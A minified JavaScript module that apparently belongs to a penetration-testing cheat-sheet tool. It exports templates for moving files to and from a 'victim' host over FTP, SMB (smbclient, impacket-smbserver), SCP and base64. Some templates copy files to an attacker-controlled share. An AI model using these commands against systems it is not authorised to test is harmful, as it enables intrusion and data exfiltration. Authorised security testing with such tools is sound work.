const e=[{title:"FTP Upload (interactive)",template:`ftp {targetip}
# Then use:
# put {filename}
# or use 'binary' before put if needed`},{title:"FTP Upload (scripted)",template:'echo -e "user anonymous\\nput {filename}\\nbye" | ftp {targetip}'},{title:"SMB Upload using smbclient",template:'smbclient \\\\{targetip}\\share -U anonymous -c "put {filename}"'},{title:"SMB Upload using impacket-smbserver",template:`impacket-smbserver shareName /path/to/folder -smb2support
# On victim:
copy {filename} \\\\{localip}\\shareName\\{filename}`},{title:"SCP Upload",template:"scp {filename} user@{targetip}:/destination/path/"},{title:"SCP Upload with different Port",template:"scp -P {port} {filename} user@{targetip}:/destination/path/"},{title:"Base64 Encode and Upload (manual)",template:`base64 {filename} > {filename}.b64
# On victim:
base64 -d {filename}.b64 > {filename}`},{title:"Base64 Upload via echo (one-liner)",template:`echo "$(base64 -w0 {filename})" > {filename}.b64
# On victim:
base64 -d {filename}.b64 > {filename}`}],t={commands:e};export{e as commands,t as default};
